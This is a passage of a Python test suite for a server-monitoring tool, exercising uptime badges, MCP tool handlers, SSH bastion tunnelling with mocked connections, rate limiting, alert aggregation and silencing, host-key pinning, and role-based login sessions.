    db.execute("DELETE FROM probes WHERE id=?", (pid,))
    db.execute("DELETE FROM probe_log WHERE probe_id=?", (pid,))
    db.execute("DELETE FROM events WHERE kind='probe' AND message LIKE '%__t_push__%'")


def t_badge():
    print("[badge]")
    from app import badge as badge_mod
    prev_tok = db.query_one("SELECT value FROM settings WHERE key='status_token'")
    db.execute("INSERT INTO settings(key,value) VALUES('status_token','__t_btok__') "
               "ON CONFLICT(key) DO UPDATE SET value=excluded.value", ())
    db.execute("DELETE FROM probes WHERE name LIKE '__t_badge%'")
    pid = db.execute(
        "INSERT INTO probes(name,kind,target,up,created_at) VALUES('__t_badge__','url','https://x',1,?)",
        (db.now(),))
    now = db.now()
    for i, okv in enumerate((1, 1, 0)):  # 24h 窗口 3 样本 2 好 1 坏 → 66.7%
        db.execute("INSERT INTO probe_log(probe_id,ts,up) VALUES(?,?,?)", (pid, now - 3600 + i, okv))
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    svg = badge_mod.probe_badge(p)
    check("up 徽章含名字与 UP", "__t_badge__" in svg and "UP" in svg)
    check("24h 可用率 66.7% 进 SVG", "66.7%" in svg)
    check("SVG 结构与 up 色板", svg.startswith("<svg") and "#16a34a" in svg and "<text" in svg)
    db.execute("UPDATE probes SET up=0 WHERE id=?", (pid,))
    svg2 = badge_mod.probe_badge(db.query_one("SELECT * FROM probes WHERE id=?", (pid,)))
    check("down 徽章红色", "#dc2626" in svg2 and "DOWN" in svg2)
    pid2 = db.execute(
        "INSERT INTO probes(name,kind,target,up,created_at) VALUES('__t_badge2__','tcp','x:1',1,?)",
        (db.now(),))
    # fleet 概览：共享库可能还有真实拨测目标，期望值从库现算（测试库无关）
    rows = db.query("SELECT up FROM probes")
    total, ups = len(rows), sum(1 for r in rows if r["up"] == 1)
    fsvg = badge_mod.fleet_badge()
    if total == 0:
        check("fleet 空表 no probes", "no probes" in fsvg)
    else:
        color = "#16a34a" if ups == total else ("#dc2626" if ups == 0 else "#d97706")
        check("fleet 概览计数与色板", f"{ups}/{total} UP" in fsvg and color in fsvg)
    check("token 校验通过/拒绝", badge_mod.token_ok("__t_btok__") and not badge_mod.token_ok("wrong"))
    db.execute("DELETE FROM probes WHERE id IN (?,?)", (pid, pid2))
    db.execute("DELETE FROM probe_log WHERE probe_id IN (?,?)", (pid, pid2))
    if prev_tok:
        db.execute("UPDATE settings SET value=? WHERE key='status_token'", (prev_tok["value"],))
    else:
        db.execute("DELETE FROM settings WHERE key='status_token'")


def t_mcp_tools():
    print("[mcp-tools]")
    from app import mcp_server
    # 工具注册表：新维度都在
    names = {x["name"] for x in mcp_server.TOOLS}
    check("工具清单含拨测与主机 extras", {"list_probes", "probe_history", "host_extras"} <= names)
    # 协议层
    r = mcp_server.handle({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
    check("initialize 握手", r["result"]["serverInfo"]["name"] == "hermes-watch")
    check("tools/list 数量一致", len(mcp_server.handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})["result"]["tools"]) == len(mcp_server.TOOLS))

    # host_extras：造一颗带 extras 的临时主机（容器/端口/失败服务）
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at,last_extras) "
        "VALUES('__t_mcp__','x','t',1,?,?)",
        (db.now(), db.j({"docker_containers": [
                             {"name": "db", "state": "exited", "status": "Exited (137)", "image": "postgres:16"},
                             {"name": "web", "state": "running", "status": "Up 3 days", "image": "nginx"}],
                         "ports": [{"port": 22, "addr": "0.0.0.0", "proc": "sshd"},
                                   {"port": 8080, "addr": "0.0.0.0", "proc": ""}],
                         "failed_services": ["nginx.service"], "cert_days_left": 21})))
    out = mcp_server.call_tool("host_extras", {"host_id": hid})["content"][0]["text"]
    check("extras 含容器状态与端口", "db [exited]" in out and "8080" in out and "nginx.service" in out)
    check("extras 含证书天数", "21 天" in out)
    check("不存在主机给提示", "不存在" in mcp_server.call_tool("host_extras", {"host_id": 999999})["content"][0]["text"])
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))

    # list_probes / probe_history：借演示库现状断言（库无关：有目标必有行，无则给空提示）
    out2 = mcp_server.call_tool("list_probes", {})["content"][0]["text"]
    total = len(db.query("SELECT id FROM probes"))
    check("list_probes 行数一致", (out2.strip().startswith("没有") and total == 0)
          or f"（{total}）" in out2)
    miss = mcp_server.call_tool("probe_history", {"probe_id": 999999})["content"][0]["text"]
    check("probe_history 不存在给提示", "不存在" in miss)
    any_p = db.query_one("SELECT id FROM probes LIMIT 1")
    if any_p:
        out3 = mcp_server.call_tool("probe_history", {"probe_id": any_p["id"]})["content"][0]["text"]
        check("probe_history 输出心跳行", "心跳" in out3)


def t_bastion():
    print("[bastion]")
    from app import ssh

    class FakeTr:
        def __init__(self, closing=False):
            self._closing = closing

        def is_closing(self):
            return self._closing

    class FakeConn:
        def __init__(self, label, dead=False):
            self.label, self.tunnel, self.closed = label, None, False
            self._transport = FakeTr(dead)

        async def wait(self):
            # 真实活连接的 wait() 会阻塞到关闭；立即返回会让 reaper 误摘缓存
            await asyncio.Event().wait()

        def close(self):
            self.closed = True
            self._transport._closing = True

    conns = []

    async def fake_connect(host_, port=None, username=None, password=None,
                           client_keys=None, known_hosts=None, client_factory=None,
                           tunnel=None, **kw):
        c = FakeConn(host_)
        c.tunnel = tunnel
        conns.append(c)
        return c

    orig = ssh.asyncssh.connect
    ssh.asyncssh.connect = fake_connect
    try:
        # ① 直连主机：行为不变，无隧道
        hid1 = db.execute(
            "INSERT INTO hosts(name,hostname,port,username,secret,group_name,mock,created_at) "
            "VALUES('__t_jump_a__','10.0.0.1',22,'root','','t',0,?)", (db.now(),))
        h1 = dict(db.query_one("SELECT * FROM hosts WHERE id=?", (hid1,)))
        conn = asyncio.run(ssh.connect_async(h1))
        check("直连主机无隧道", len(conns) == 1 and conn.tunnel is None)
        db.execute("DELETE FROM hosts WHERE id=?", (hid1,))
        conns.clear()

        # ② 堡垒机主机：先连跳板再隧道连目标
        ssh._bastions.clear()
        conns.clear()
        hid = db.execute(
            "INSERT INTO hosts(name,hostname,port,username,secret,group_name,mock,created_at,"
            "bastion_host,bastion_port,bastion_username,bastion_key_fp) "
            "VALUES('__t_jump__','10.0.0.9',22,'root','','t',0,?, 'jump.corp',2222,'ops','')",
            (db.now(),))
        h = dict(db.query_one("SELECT * FROM hosts WHERE id=?", (hid,)))
        conn = asyncio.run(ssh.connect_async(h))
        check("跳板先连、目标后连且经其隧道",
              len(conns) == 2 and conns[0].label == "jump.corp"
              and conns[1].label == "10.0.0.9" and conns[1].tunnel is conns[0])
        # ③ 跳板连接池：第二轮复用跳板（不再握手），隧道挂同一条
        conn = asyncio.run(ssh.connect_async(h))
        check("第二轮复用缓存跳板",
              len(conns) == 3 and conns[2].tunnel is conns[0])
        # ④ 跳板 TOFU 指纹写独立列，不污染目标机指纹
        class K:
            def get_fingerprint(self, algo="sha256"):
                return "SHA256:JUMPKEY"
        cl = ssh._TofuClient({"id": hid, "hostname": "jump.corp",
                              "host_key_fp": "", "_fp_col": "bastion_key_fp"})
        check("跳板指纹写 bastion_key_fp",
              cl.validate_host_public_key("jump.corp", "1.2.3.4", 22, K())
              and db.query_one("SELECT bastion_key_fp FROM hosts WHERE id=?", (hid,))["bastion_key_fp"] == "SHA256:JUMPKEY")
        check("目标机指纹列未被污染",
              db.query_one("SELECT host_key_fp FROM hosts WHERE id=?", (hid,))["host_key_fp"] == "")
        # ⑤ 目标失败且跳板仍活：不白握跳板手，直接抛
        conns.clear()
        ssh._bastions.clear()

        async def fail_target_alive(host_, port=None, tunnel=None, **kw):
            if tunnel is not None:
                raise OSError("bad target password")
            c = FakeConn("bastion")
            conns.append(c)
            return c

        ssh.asyncssh.connect = fail_target_alive
        try:
            asyncio.run(ssh.connect_async(h))
            check("目标失败应抛错", False)
        except OSError:
            check("目标失败向上抛错", True)
        check("跳板存活时不重复握手", len(conns) == 1)
        # ⑥ 跳板已死：丢弃缓存重建一次再试
        ssh._bastions.clear()
        conns.clear()
        state = {"attempt": 0}

        async def dead_bastion(host_, port=None, tunnel=None, **kw):
            state["attempt"] += 1
            if tunnel is None:  # 跳板连接：第 1 次建死跳板，第 2 次建活跳板
                c = FakeConn("bastion", dead=(state["attempt"] == 1))
                conns.append(c)
                return c
            if state["attempt"] == 2:  # 目标连接跑在死跳板上 → 失败
                raise OSError("tunnel on dead bastion")
            c = FakeConn("target")
            c.tunnel = tunnel
            conns.append(c)
            return c

        ssh.asyncssh.connect = dead_bastion
        conn = asyncio.run(ssh.connect_async(h))
        check("死跳板自动重建并连上目标",
              len(conns) == 3 and conn.tunnel is conns[1] and conn.label == "target")
        db.execute("DELETE FROM hosts WHERE id=?", (hid,))
        # ⑦ 跳板口令加密回环（与主机口令同机制）
        from app import secrets as sec
        enc = sec.encrypt("jump-pw")
        check("跳板口令加密回环", sec.decrypt(enc) == "jump-pw")
    finally:
        ssh.asyncssh.connect = orig


def t_guard():
    print("[guard]")
    from app import guard
    check("窗口内正常放行", guard.allow("1.2.3.4") and guard.allow("1.2.3.4"))
    guard.MAX_REQ, save_max = 3, guard.MAX_REQ
    try:
        ips = [guard.allow("5.6.7.8") for _ in range(3)]
        check("窗口内第 3 次仍放行、第 4 次超限拒绝", all(ips) and not guard.allow("5.6.7.8"))
        check("按 IP 隔离", guard.allow("9.9.9.9"))
    finally:
        guard.MAX_REQ = save_max
    guard.audit("1.1.1.1", "/badge/x.svg", 200)
    guard.audit("2.2.2.2", "/status/tok", 404)
    rec = guard.recent()
    check("审计环形缓冲按序记录", rec[-2:][0]["ip"] == "1.1.1.1" and rec[-1]["code"] == 404)


def t_alert_aggregate():
    print("[alert-aggregate]")
    from app import scheduler
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at) VALUES('__t_agg__','x','t',1,?)",
        (db.now(),))
    h = dict(db.query_one("SELECT * FROM hosts WHERE id=?", (hid,)))
    sent = []
    orig = scheduler.notify.send

    async def fake_send(kind, body):
        sent.append((kind, body))
        return True, ""

    scheduler.notify.send = fake_send
    try:
        new = asyncio.run(scheduler.process_findings(h, {"disk": 96, "mem": 93, "cpu": 10, "load1": 0.5}, {}))
        crits = [f for f in new if f["severity"] == "crit"]
        check("同轮双 crit 只发一条聚合通知", len(crits) == 2 and len(sent) == 1)
        check("聚合通知含两条标题行", sent[0][1].count("•") == 2)
        marks = [r["last_notified"] for r in
                 db.query("SELECT last_notified FROM findings WHERE host_id=?", (hid,))]
        check("两条发现均已标记 last_notified", all(marks) and len(marks) == 2)
    finally:
        scheduler.notify.send = orig
        db.execute("DELETE FROM findings WHERE host_id=?", (hid,))
        db.execute("DELETE FROM events WHERE host_id=?", (hid,))
        db.execute("DELETE FROM proposals WHERE finding_id NOT IN (SELECT id FROM findings)")
        db.execute("DELETE FROM hosts WHERE id=?", (hid,))


def t_tofu():
    print("[tofu]")
    from app import ssh
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at,host_key_fp) "
        "VALUES('__t_tofu__','x','t',1,?, '')", (db.now(),))
    h = db.query_one("SELECT * FROM hosts WHERE id=?", (hid,))
    class _K:
        def get_fingerprint(self, algo="sha256"): return "SHA256:AAA"
    # 首次连接：记录指纹并放行
    ok = ssh._TofuClient(dict(h)).validate_host_public_key("x", "x", 22, _K())
    stored = db.query_one("SELECT host_key_fp FROM hosts WHERE id=?", (hid,))["host_key_fp"]
    check("首次连接放行并记录指纹", ok and stored == "SHA256:AAA")
    # 指纹一致放行
    ok2 = ssh._TofuClient(dict(db.query_one("SELECT * FROM hosts WHERE id=?", (hid,)))).validate_host_public_key("x", "x", 22, _K())
    check("指纹一致放行", ok2)
    # 指纹变更 → HostKeyChanged
    class _K2:
        def get_fingerprint(self, algo="sha256"): return "SHA256:BBB"
    try:
        ssh._TofuClient(dict(db.query_one("SELECT * FROM hosts WHERE id=?", (hid,)))).validate_host_public_key("x", "x", 22, _K2())
        check("指纹变更拒绝", False)
    except ssh.HostKeyChanged as e:
        check("指纹变更拒绝", "变更" in str(e))
    check("库中指纹未被污染", db.query_one("SELECT host_key_fp FROM hosts WHERE id=?", (hid,))["host_key_fp"] == "SHA256:AAA")
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))


def t_ack_and_silence():
    print("[ack-silence]")
    # _resend_crit 前置要求渠道已配置（否则直接返回），注入假 webhook
    db.execute("INSERT INTO settings(key,value) VALUES('webhook_url','https://example.invalid/hook') "
               "ON CONFLICT(key) DO UPDATE SET value=excluded.value")
    db.execute("INSERT INTO settings(key,value) VALUES('notify_resend_min','30') "
               "ON CONFLICT(key) DO UPDATE SET value=excluded.value")
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at,silenced_until) "
        "VALUES('__t_ack__','x','t',1,?, 0)", (db.now(),))
    fid = db.execute(
        "INSERT INTO findings(host_id,ts,type,severity,title,detail,evidence) VALUES(?,?,?,?,?,?,?)",
        (hid, db.now() - 1900, "cpu", "crit", "【测试】CPU 100%", "test", "{}"))  # ts 拨回 31 分钟前，越过重发窗口
    from app import scheduler

    def q_rows():
        return scheduler.db.query(
            "SELECT id, host_id, type, severity, ts, last_notified, acked_at, title FROM findings WHERE id=?", (fid,))

    scheduler._resend_crit("t", q_rows(), {"cpu"})
    last1 = db.query_one("SELECT last_notified FROM findings WHERE id=?", (fid,))["last_notified"]
    check("未确认未静默且超重发窗口 → last_notified 更新", last1 is not None)
    # 确认后 → 不再重发（重查行，模拟真实每轮快照）
    db.execute("UPDATE findings SET last_notified=NULL, acked_at=? WHERE id=?", (db.now(), fid))
    scheduler._resend_crit("t", q_rows(), {"cpu"})
    check("已确认 → 跳过重发", db.query_one("SELECT last_notified FROM findings WHERE id=?", (fid,))["last_notified"] is None)
    # 静默中 → 跳过重发
    db.execute("UPDATE findings SET acked_at=NULL WHERE id=?", (fid,))
    db.execute("UPDATE hosts SET silenced_until=? WHERE id=?", (db.now() + 600, hid))
    scheduler._resend_crit("t", q_rows(), {"cpu"})
    check("静默中 → 跳过重发", db.query_one("SELECT last_notified FROM findings WHERE id=?", (fid,))["last_notified"] is None)
    db.execute("DELETE FROM findings WHERE id=?", (fid,))
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))
    db.execute("DELETE FROM settings WHERE key IN ('notify_resend_min','webhook_url')")


def t_rbac():
    print("[rbac]")
    # 多用户 CRUD + 角色校验
    uid1 = auth.add_user("__t_admin__", "pw-admin-1", "admin")
    uid2 = auth.add_user("__t_obs__", "pw-obs-1", "observer")
    check("添加 admin/observer", auth.has_users())
    users = {u["username"]: u["role"] for u in auth.list_users()}
    check("用户清单角色正确", users.get("__t_admin__") == "admin" and users.get("__t_obs__") == "observer")
    # 登录：正确/错误口令，observer 登录得 observer 角色
    ok, role = auth.verify_login("__t_admin__", "pw-admin-1")
    check("admin 登录", ok and role == "admin")
    ok2, role2 = auth.verify_login("__t_obs__", "pw-obs-1")
    check("observer 登录", ok2 and role2 == "observer")
    ok3, _ = auth.verify_login("__t_obs__", "wrong")
    check("错误口令拒绝", not ok3)
    # 会话携带角色 + 防篡改
    s_admin = auth.make_session("admin")
    s_obs = auth.make_session("observer")
    check("admin 会话 → admin", auth.session_role(s_admin) == "admin")
    check("observer 会话 → observer", auth.session_role(s_obs) == "observer")
    # observer 伪造 admin 角色串：签名不含 admin，校验失败
    tampered = s_obs.replace(".observer.", ".admin.")
    check("角色篡改拒绝", auth.session_role(tampered) == "")
    # 角色变更 → 旧会话整体作废
    auth.set_role(uid2, "admin")
    check("角色变更后旧 observer 会话作废", auth.session_role(s_obs) == "")
    ok4, role4 = auth.verify_login("__t_obs__", "pw-obs-1")
    check("角色已更新为 admin", role4 == "admin")
    auth.set_role(uid2, "observer")
    # 最后管理员保护在端点层（main._require_admin + users_del），这里测删除行为
    auth.del_user(uid1)
    auth.del_user(uid2)
    check("清理后无用户", not auth.has_users())


if __name__ == "__main__":
    db.init_db()
    t_rules()
    t_executor()
    t_auth()
    t_agent_sig()
    t_secrets()
    t_analysis_card()
    t_session_epoch()
    t_recovery()
    t_offline()
    t_nan_guard()
    t_hysteresis()
    t_quiet_hours()
    t_anonymize()
    t_chat_stream_fallback()
    t_notify_log()
    t_backups()
    t_probes()
    t_probe_parallel()
    t_probe_real_parallel()
    t_probe_dns_push()
    t_badge()
    t_mcp_tools()
    t_bastion()
    t_guard()
    t_alert_aggregate()
    t_tofu()
    t_ack_and_silence()
    t_rbac()
    print(f"\n{PASS} passed, {FAIL} failed")
    sys.exit(1 if FAIL else 0)
